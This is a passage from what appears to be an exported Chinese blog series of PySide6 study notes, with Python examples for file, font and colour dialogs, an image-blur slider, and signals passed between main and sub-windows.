btn.clicked.connect(self.bind)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-string\">&quot;&quot;&quot;</span><br><span class=\"hljs-string\">        参数：</span><br><span class=\"hljs-string\">        第一个永远是self</span><br><span class=\"hljs-string\">        第二个是标题</span><br><span class=\"hljs-string\">        第三个是默认打开路径 例如. 或者 ../这种</span><br><span class=\"hljs-string\">        第四个是显示哪些后缀的文件 例如所有文件(*.py);;这个是MP3(*.mp3)</span><br><span class=\"hljs-string\">        &quot;&quot;&quot;</span><br>        <span class=\"hljs-comment\"># 获取多文件 返回元组 元组的第一项是文件名列表</span><br>        fileDialog = QFileDialog.getOpenFileNames(self)<br>        <span class=\"hljs-built_in\">print</span>(fileDialog)<br>        <span class=\"hljs-comment\"># 获取单文件 返回元组</span><br>        fileDialog2 = QFileDialog.getOpenFileName(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;.&#x27;</span>, <span class=\"hljs-string\">&#x27;所有py文件(*.py);;所有mp文件(.mp3 *mp4)&#x27;</span>)<br>        <span class=\"hljs-built_in\">print</span>(fileDialog2)<br>        <span class=\"hljs-comment\"># 返回字符串</span><br>        fileDialog3 = QFileDialog.getExistingDirectory(self)<br>        <span class=\"hljs-built_in\">print</span>(fileDialog3)<br>        <span class=\"hljs-comment\"># 返回元组</span><br>        fileDialog4 = QFileDialog.getSaveFileName(self)<br>        <span class=\"hljs-built_in\">print</span>(fileDialog4)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<p>ok速通</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#12","url":"/2023/05/03/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12/","content":"<p>今天做一个小项目：设置图像模糊度</p>\n<span id=\"more\"></span>\n\n<p>看到就知道要用到哪些控件了吧</p>\n<ul>\n<li><p>QPushButton 这个肯定有</p>\n</li>\n<li><p>QSlider 这个用脚想都知道有</p>\n</li>\n<li><p>QFileDialog 这个用脚想都知道有</p>\n</li>\n<li><p>QLabel 你肯定想不到这个是用来展示图片的</p>\n</li>\n</ul>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication,  QWidget, QVBoxLayout, QSlider, QFileDialog, QLabel, QPushButton<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><span class=\"hljs-comment\"># from PySide6.QtGui import QPixmap</span><br><span class=\"hljs-keyword\">from</span> PIL <span class=\"hljs-keyword\">import</span> ImageFilter, ImageQt, Image<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-comment\"># 用来打开图像的按钮</span><br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;导入图像&#x27;</span>)<br>        btn.clicked.connect(self.getImg)<br>        <span class=\"hljs-comment\"># 用来展示图片的标签</span><br>        self.lbShowImg = QLabel()<br>        <span class=\"hljs-comment\"># 用来设置模糊度的滑条</span><br>        self.slider = QSlider(Qt.Orientation.Horizontal)<br>        self.slider.setRange(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">20</span>)    <span class=\"hljs-comment\"># 设置刻度范围</span><br>        self.slider.setTickPosition(QSlider.TickPosition.TicksBelow)     <span class=\"hljs-comment\"># 设置滑条刻度位置</span><br>        self.slider.setTickInterval(<span class=\"hljs-number\">3</span>)     <span class=\"hljs-comment\"># 设置间隔</span><br>        self.slider.valueChanged.connect(self.valueChanged)<br><br>        <span class=\"hljs-comment\"># 设置布局</span><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(btn)<br>        self.mainLayout.addWidget(self.lbShowImg)<br>        self.mainLayout.addWidget(self.slider)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getImg</span>(<span class=\"hljs-params\">self</span>):<br>        self.img = Image.<span class=\"hljs-built_in\">open</span>(QFileDialog.getOpenFileName(self, <span class=\"hljs-string\">&#x27;请选择一个文件&#x27;</span>, <span class=\"hljs-string\">&#x27;.&#x27;</span>, <span class=\"hljs-string\">&#x27;所有图像文件(.jpg *.jpeg *.png)&#x27;</span>)[<span class=\"hljs-number\">0</span>])<br>        self.lbShowImg.setPixmap(ImageQt.toqpixmap(self.img))<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">valueChanged</span>(<span class=\"hljs-params\">self, value</span>):    <span class=\"hljs-comment\"># slider会自动传入参数value</span><br>        self.filterImg = self.img.<span class=\"hljs-built_in\">filter</span>(ImageFilter.GaussianBlur(value))<br>        self.lbShowImg.setPixmap(ImageQt.toqpixmap(self.filterImg))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br><br></code></pre></td></tr></table></figure>\n\n<p>似乎并不需要那个QPixmap😂</p>\n<p>这里有几个坑：</p>\n<ul>\n<li><p>29行一定要Imageopen不然他不是一个图片对象是个string</p>\n</li>\n<li><p>选择的图片分辨率不要太高，不然打开之后你连图片都看不全</p>\n</li>\n</ul>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#14","url":"/2023/05/05/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-14/","content":"<p>今天学习的内容是子窗口向主窗口传递信号</p>\n<span id=\"more\"></span>\n\n<h1 id=\"子窗口向主窗口传递信号\"><a href=\"#子窗口向主窗口传递信号\" class=\"headerlink\" title=\"子窗口向主窗口传递信号\"></a>子窗口向主窗口传递信号</h1><p>其实和主窗口和子窗口传递信号的区别就是，</p>\n<p>主窗口创建子窗口的时候需要传入自身（self）</p>\n<p>然后子窗口需要设置一个parent也就是父类属性就可以了</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLineEdit, QPushButton<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Signal<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MainWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setWindowTitle(<span class=\"hljs-string\">&#x27;主窗口&#x27;</span>)<br>        self.mainLineEdit = QLineEdit()<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.mainLineEdit)<br>        self.setLayout(self.mainLayout)<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):     <span class=\"hljs-comment\"># 绑定</span><br>        self.subwindow = SubWindow(self)    <span class=\"hljs-comment\"># 创建的时候传入自身方便子窗口调用主窗口</span><br>        self.subwindow.show()<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SubWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    sendValueToMainWindow = Signal(<span class=\"hljs-built_in\">str</span>)    <span class=\"hljs-comment\"># 传递的参数是什么类型 不知道写什么就直接填写object</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self, parent=<span class=\"hljs-literal\">None</span></span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setWindowTitle(<span class=\"hljs-string\">&#x27;子窗口&#x27;</span>)<br>        self.parent = parent<br>        self.lineEdit = QLineEdit()<br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;Send&#x27;</span>)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lineEdit)<br>        self.mainLayout.addWidget(self.btn)<br>        self.setLayout(self.mainLayout)<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):     <span class=\"hljs-comment\"># 绑定</span><br>        self.sendValueToMainWindow.connect(self.parent.mainLineEdit.setText)<br>        self.btn.clicked.connect(self.sendValue)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">sendValue</span>(<span class=\"hljs-params\">self</span>):      <span class=\"hljs-comment\"># 激活</span><br>        self.sendValueToMainWindow.emit(self.lineEdit.text())<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MainWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>正常运行🆗</p>\n<p>为了更加直观，我设置了一下窗口的标题</p>\n<h1 id=\"小练手\"><a href=\"#小练手\" class=\"headerlink\" title=\"小练手\"></a>小练手</h1><p>下面一节课的就是一个简单的启动页面了，</p>\n<p>这个其实就是主窗口向子窗口传递信号，</p>\n<p>我觉得可以再加上一个子窗口播放完动画之后向主窗口传递信号的东西</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QLabel, QVBoxLayout<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Signal, Qt, QTimer<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QFont<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">LoadingWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    sendSignalToSubWindow = Signal(<span class=\"hljs-built_in\">str</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.loadingLabel = QLabel(<span class=\"hljs-string\">&#x27;加载中...&#x27;</span>)<br>        self.loadingLabel.setFont(QFont(<span class=\"hljs-string\">&#x27;微软雅黑&#x27;</span>, <span class=\"hljs-number\">50</span>))<br>        self.loadingLabel.setAlignment(Qt.AlignmentFlag.AlignCenter)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.loadingLabel)<br>        self.setLayout(self.mainLayout)<br>        QTimer.singleShot(<span class=\"hljs-number\">2000</span>,  self.bind)<br><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        self.mainWindow = MainWindow()<br>        self.sendSignalToSubWindow.connect(self.mainWindow.loadingLabel.setText)<br>        self.func()<br>        self.mainWindow.show()<br>        self.close()  <span class=\"hljs-comment\"># 这里也可以写self.hide()</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">func</span>(<span class=\"hljs-params\">self</span>):<br>        self.sendSignalToSubWindow.emit(<span class=\"hljs-string\">&#x27;你成功了！！！&#x27;</span>)<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MainWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.loadingLabel = QLabel()<br>        self.loadingLabel.setFont(QFont(<span class=\"hljs-string\">&#x27;微软雅黑&#x27;</span>, <span class=\"hljs-number\">20</span>))<br>        self.loadingLabel.setAlignment(Qt.AlignmentFlag.AlignCenter)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.loadingLabel)<br>        self.setLayout(self.mainLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = LoadingWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>这里有一个需要注意的：</p>\n<p>就是这个QTimer是不可以替换的，</p>\n<p>我在写代码之前，信誓旦旦的认为可以用time.sleep()这个模块，</p>\n<p>来实现同样的效果，</p>\n<p>结果试了一下才发现，，，</p>\n<p>如果使用time.sleep()那么主窗口和子窗口其实是同时出现的，</p>\n<p>都是一起等待2秒然后出现的，</p>\n<p>我也不知道为什么就是很奇怪</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#13","url":"/2023/05/04/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-13/","content":"<p>今天学习两个控件：QFontDialog QColorDialog</p>\n<p>以及子窗口和多窗口的前面的一些，内容比较多</p>\n<span id=\"more\"></span>\n\n<p>我觉得把所有控件学完了可以尝试给我的远控加上ui</p>\n<p>（那将是无比帅气的一件事情</p>\n<h1 id=\"QFontDialog\"><a href=\"#QFontDialog\" class=\"headerlink\" title=\"QFontDialog\"></a>QFontDialog</h1><p>这个简单极了</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QFontDialog, QTextEdit, QPushButton<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.edit = QTextEdit()<br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;切换字体&#x27;</span>)<br>        self.btn.clicked.connect(self.changeFont)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.edit)<br>        self.mainLayout.addWidget(self.btn)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">changeFont</span>(<span class=\"hljs-params\">self</span>):<br>        ok, font = QFontDialog.getFont()<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span>  ok: <span class=\"hljs-keyword\">return</span><br>        self.edit.setFont(font)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>泰裤辣！</p>\n<h1 id=\"QColorDialog\"><a href=\"#QColorDialog\" class=\"headerlink\" title=\"QColorDialog\"></a>QColorDialog</h1><h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QColorDialog, QPushButton, QTextEdit<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;切换颜色&#x27;</span>)<br>        self.edit = QTextEdit()<br>        self.btn.clicked.connect(self.changeColor)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.edit)<br>        self.mainLayout.addWidget(self.btn)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">changeColor</span>(<span class=\"hljs-params\">self</span>):<br>        color = QColorDialog.getColor()<br>        self.edit.setTextColor(color)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>速通！</p>\n\n\n<h1 id=\"子窗口、多窗口\"><a href=\"#子窗口、多窗口\" class=\"headerlink\" title=\"子窗口、多窗口\"></a>子窗口、多窗口</h1><h2 id=\"基本\"><a href=\"#基本\" class=\"headerlink\" title=\"基本\"></a>基本</h2><p>这个也是依旧简单，</p>\n<p>我就直接cv up的代码了</p>\n<h3 id=\"代码-2\"><a href=\"#代码-2\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.subwindow = SubWindow()<br><br>        self.lb = QLabel(<span class=\"hljs-string\">&#x27;这个是主窗口&#x27;</span>)<br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;打开子窗口&#x27;</span>)<br>        self.btn.clicked.connect(self.openSubWindow)<br><br>        self.btnClose = QPushButton(<span class=\"hljs-string\">&#x27;关闭子窗口&#x27;</span>)<br>        self.btnClose.clicked.connect(self.closeSubWindow)<br><br>        self.btnHide = QPushButton(<span class=\"hljs-string\">&#x27;隐藏子窗口&#x27;</span>)<br>        self.btnHide.clicked.connect(self.hideSubWindow)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.mainLayout.addWidget(self.btn)<br>        self.mainLayout.addWidget(self.btnClose)<br>        self.mainLayout.addWidget(self.btnHide)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">openSubWindow</span>(<span class=\"hljs-params\">self</span>):<br>        self.subwindow.show()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">closeSubWindow</span>(<span class=\"hljs-params\">self</span>):<br>        self.subwindow.close()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">hideSubWindow</span>(<span class=\"hljs-params\">self</span>):<br>        self.subwindow.hide()<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SubWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lb = QLabel(<span class=\"hljs-string\">&#x27;这个是子窗口&#x27;</span>)<br>        self.lineEdit = QLineEdit()<br>        self.lineEdit.setText(<span class=\"hljs-string\">&#x27;这是子窗口的文本框&#x27;</span>)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.mainLayout.addWidget(self.lineEdit)<br>        self.setLayout(self.mainLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"自定义信号以及子窗口向主窗口传递参数\"><a href=\"#自定义信号以及子窗口向主窗口传递参数\" class=\"headerlink\" title=\"自定义信号以及子窗口向主窗口传递参数\"></a>自定义信号以及子窗口向主窗口传递参数</h2><p>现在就不再是信号发出后去到只指定的槽，</p>\n<p>而是可以自己定义信号触发后做些什么</p>\n<h3 id=\"代码-3\"><a href=\"#代码-3\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLineEdit, QPushButton<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Signal<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    sendValueToSubWindow = Signal(<span class=\"hljs-built_in\">str</span>)    <span class=\"hljs-comment\"># 传递的参数是什么类型 不知道写什么就直接填写object</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lineEdit = QLineEdit()<br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;Send&#x27;</span>)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lineEdit)<br>        self.mainLayout.addWidget(self.btn)<br>        self.setLayout(self.mainLayout)<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):     <span class=\"hljs-comment\"># 绑定</span><br>        self.subwindow = SubWindow()    <span class=\"hljs-comment\"># 创建的位置不要太靠前</span><br>        self.sendValueToSubWindow.connect(self.subwindow.edit.setText)    <span class=\"hljs-comment\"># 直接绑定到具体的方法上</span><br>        self.btn.clicked.connect(self.sendValue)<br>        self.subwindow.show()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">sendValue</span>(<span class=\"hljs-params\">self</span>):      <span class=\"hljs-comment\"># 激活</span><br>        text = self.lineEdit.text()<br>        self.sendValueToSubWindow.emit(text)     <span class=\"hljs-comment\"># 发送这个东西</span><br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SubWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.edit = QLineEdit()<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.edit)<br>        self.setLayout(self.mainLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<p>这里有几个要注意的：</p>\n<ul>\n<li><p>需要从QtCore自己导入Signal信号库</p>\n</li>\n<li><p>信号的定义需要在函数体的外面</p>\n</li>\n<li><p>子窗口（在代码中）创建的位置不要太靠前</p>\n</li>\n</ul>\n\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#15","url":"/2023/05/06/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-15/","content":"<p>今天学习QMenuBar QMenu QAction 三个控件</p>\n<span id=\"more\"></span>\n\n<p>今天是主窗口和子窗口的最后一节课</p>\n<p>up介绍了一个奇技淫巧，</p>\n<h1 id=\"新的传参方式\"><a href=\"#新的传参方式\" class=\"headerlink\" title=\"新的传参方式\"></a>新的传参方式</h1><h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QPushButton, QLabel, QLineEdit<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MainWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lbAccount = QLabel(<span class=\"hljs-string\">&#x27;账号&#x27;</span>)<br>        self.lbPassword = QLabel(<span class=\"hljs-string\">&#x27;密码&#x27;</span>)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lbAccount)<br>        self.mainLayout.addWidget(self.lbPassword)<br>        self.setLayout(self.mainLayout)<br><br>        self.subWindow = SubWindow(self)<br>        self.subWindow.show()<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SubWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self, parent=<span class=\"hljs-literal\">None</span></span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.parent = parent<br><br>        self.lbAccount = QLabel(<span class=\"hljs-string\">&#x27;账号&#x27;</span>)<br>        self.leAccount = QLineEdit()<br>        self.lbPassword = QLabel(<span class=\"hljs-string\">&#x27;密码&#x27;</span>)<br>        self.lePassword = QLineEdit()<br>        self.btnLogin = QPushButton(<span class=\"hljs-string\">&#x27;发送&#x27;</span>)<br>        self.btnLogin.clicked.connect(self.sendValue)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lbAccount)<br>        self.mainLayout.addWidget(self.leAccount)<br>        self.mainLayout.addWidget(self.lbPassword)<br>        self.mainLayout.addWidget(self.lePassword)<br>        self.mainLayout.addWidget(self.btnLogin)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">sendValue</span>(<span class=\"hljs-params\">self</span>):<br>        self.parent.lbAccount.setText(<span class=\"hljs-string\">&#x27;账号:&#x27;</span>+self.leAccount.text())<br>        self.parent.lbPassword.setText(<span class=\"hljs-string\">&#x27;密码:&#x27;</span>+self.lePassword.text())<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MainWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>原理就是调用self.parent</p>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n\n<h1 id=\"三个控件\"><a href=\"#三个控件\" class=\"headerlink\" title=\"三个控件\"></a>三个控件</h1><p>只能用QMainWindow，</p>\n<p>这个QMainWindow的布局方式和QWidget不一样</p>\n<h2 id=\"1-QMenuBar-QMenu-QAction-在QtDesigner中\"><a href=\"#1-QMenuBar-QMenu-QAction-在QtDesigner中\" class=\"headerlink\" title=\"1 QMenuBar QMenu QAction 在QtDesigner中\"></a>1 QMenuBar QMenu QAction 在QtDesigner中</h2><p>首先绘制一个ui，</p>\n<p>然后编译为py文件，</p>\n<blockquote>\n<p> <strong>注意：</strong></p>\n<p><strong>这里要将PySide6导入时候的QWidget给改成QMainWIndow</strong></p>\n</blockquote>\n<p>然后setupui界面就出来了</p>\n<h3 id=\"设置快捷键\"><a href=\"#设置快捷键\" class=\"headerlink\" title=\"设置快捷键\"></a>设置快捷键</h3><p>设置快捷键的话就是在qtdesigner的右下角动作编辑器，</p>\n<p>点开以后设置就可以了</p>\n<h3 id=\"工具栏\"><a href=\"#工具栏\" class=\"headerlink\" title=\"工具栏\"></a>工具栏</h3><p>添加方法就是在qtdesigner里面右键，</p>\n<p>然后第一行就是添加工具栏，</p>\n<p>他的作用就像qtdesigner这个工具本身的工具栏一样，</p>\n<p>在菜单栏下面有一些快捷键比如保存 设置垂直 水平布局什么的  </p>\n<p>直接在右下角动作编辑器里面的action拖进去就可以了</p>\n<h3 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td 